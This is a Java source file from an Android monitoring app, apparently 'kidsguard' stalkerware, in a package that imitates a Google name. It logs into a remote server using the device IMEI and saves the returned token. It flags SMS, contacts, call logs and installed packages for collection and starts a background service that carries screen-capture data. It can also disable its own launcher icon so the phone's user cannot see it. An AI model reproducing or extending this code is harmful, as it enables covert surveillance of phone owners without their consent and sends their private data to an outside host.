package com.google.cloudservices;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

import static android.content.Context.ALARM_SERVICE;
import static android.content.Context.JOB_SCHEDULER_SERVICE;

public class CodeLogin {
    public void codelog(final Context context, final String code, final Boolean hide, final int resultCode, final Intent data, final int mScreenDensity, String imeis, final int width, final int height){
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//            SendEror sendEror=new SendEror();
//            sendEror.sender(context,"request permition for phone");
//            // TODO: Consider calling
//            //    ActivityCompat#requestPermissions
//            // here to request the missing permissions, and then overriding
//            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
//            //                                          int[] grantResults)
//            // to handle the case where the user grants the permission. See the documentation
//            // for ActivityCompat#requestPermissions for more details.
//            return;
//        }
        String imei;
//        try {
//            imei = telephonyManager.getDeviceId();}catch (Exception e){
//
//        }
        imei=imeis;
        String url="https://im.kidsguard.pro/api/login-kid/";
        Log.e("toooooooooooken234", imei );
        final String finalImei = imei;
        StringRequest stringRequest=new StringRequest(Request.Method.POST,url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        try {
                            JSONObject jsonactivechild=new JSONObject(response);
                            String status=jsonactivechild.getString("status");


                            switch (status){
                                case "ok":
                                    String token=jsonactivechild.getString("kidToken");
                                    TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
                                    tokenDataBaseManager.Insertoken(token);
                                    Intent intent=new Intent(context,childService.class);
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                        dbFirsRun dbFirsRun=new dbFirsRun(context);
                                        if (dbFirsRun.getrun().size()>0){}else {
                                            dbFirsRun.Insertrun("smsfirst");
                                            dbFirsRun.Insertrun("contactfirst");
                                            dbFirsRun.Insertrun("callfirst");
                                            dbFirsRun.Insertrun("packfirst");
                                        }
//                                        Calendar calendar = Calendar.getInstance();
//                                        calendar.set(Calendar.HOUR_OF_DAY, 4);
//                                        calendar.set(Calendar.MINUTE, 0);
//                                        setalarm(calendar,context,resultCode,data,mScreenDensity,1);
//                                        calendar = Calendar.getInstance();
//                                        calendar.set(Calendar.HOUR_OF_DAY, 10);
//                                        calendar.set(Calendar.MINUTE, 0);
//                                        setalarm(calendar,context,resultCode,data,mScreenDensity,2);
//                                        calendar = Calendar.getInstance();
//                                        calendar.set(Calendar.HOUR_OF_DAY, 16);
//                                        calendar.set(Calendar.MINUTE, 0);
//                                        setalarm(calendar,context,resultCode,data,mScreenDensity,3);
//                                        calendar = Calendar.getInstance();
//                                        calendar.set(Calendar.HOUR_OF_DAY, 22);
//                                        calendar.set(Calendar.MINUTE, 0);
//                                        setalarm(calendar,context,resultCode,data,mScreenDensity,4);

                                        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                                intent.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                                                .putExtra(childService.EXTRA_RESULT_INTENT, data)
                                                .putExtra("density", mScreenDensity)
                                                .putExtra("width", width)
                                                .putExtra("height", height);
                                     //   ContextCompat.startForegroundService(context,intent);
                                        context.startService(intent);
                                    }
                                    Intent intent2 = new Intent(Intent.ACTION_MAIN);
                                    intent2.addCategory(Intent.CATEGORY_HOME);
                                    intent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    context.startActivity(intent2);
//                                    Intent i = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
//                                    i.putExtra(Settings.EXTRA_APP_PACKAGE, context.getPackageName());
//                                    i.putExtra(Settings.EXTRA_CHANNEL_ID, context.getApplicationInfo().uid);
//                                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                    context.startActivity(i);
                                    if (hide){
                                        try {
                                            ComponentName componentToDisable=new ComponentName("pro.tasking","MainActivity");

                                            context.getPackageManager().setComponentEnabledSetting(
                                                    componentToDisable,
                                                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                                    PackageManager.DONT_KILL_APP);}catch (Exception e){}}
                                  /*  int pid = android.os.Process.myPid();
                                    android.os.Process.killProcess(pid);*/

                                    break;
                                case  "error":
                                    String message=jsonactivechild.getString("message");
                                    SendEror sendEror=new SendEror();
                                    sendEror.sender(context,"code login:"+message);
                              //      Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
                                    break;
                            }

                        } catch (JSONException e) {
                            e.printStackTrace();
                            SendEror sendEror=new SendEror();
                            sendEror.sender(context,"code login:"+e.toString());
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            //    Toast.makeText(context, error.toString(), Toast.LENGTH_SHORT).show();
                SendEror sendEror=new SendEror();
                sendEror.sender(context,"code login:"+error.toString());
            }

        })
        {
            @Override
            protected Map<String, String> getParams(){
                Map<String,String> params=new HashMap<String, String>();
                params.put("code",code);
                params.put("imei", finalImei);
                return params;
            }
        };
        RequestQueue requestQueue=Volley.newRequestQueue(context);
        requestQueue.add(stringRequest);
        Log.e("1343233", imei );
    }
    public void jobservice(){

    }
//    public void jobset(Context context,ComponentName componentName){
//        JobInfo info = new JobInfo.Builder(123, componentName)
//                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED)
//                .setPersisted(true)
//                .setPeriodic(15 * 60 * 1000)
//                .build();
//
//        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
//        scheduler.schedule(info);
//    }
//    public void jobset2(Context context,ComponentName componentName){
//        JobInfo info = new JobInfo.Builder(1234, componentName)
//                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED)
//                .setPersisted(true)
//                .setPeriodic(15 * 60 * 1000)
//                .build();
//
//        JobScheduler scheduler = (JobScheduler) context.getSystemService(JOB_SCHEDULER_SERVICE);
//        scheduler.schedule(info);
//    }
    private void setalarm(Calendar calendar,Context context,int resultCode, Intent data,int mScreenDensity,int id) {
        Intent intent = new Intent(context, AllarmReceiver.class);
        intent.putExtra(childService.EXTRA_RESULT_CODE, resultCode)
                .putExtra(childService.EXTRA_RESULT_INTENT, data)
                .putExtra("density", mScreenDensity);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, id, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);

        if (alarmManager != null) {
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), AlarmManager.INTERVAL_DAY, pendingIntent);

        }
    }
}
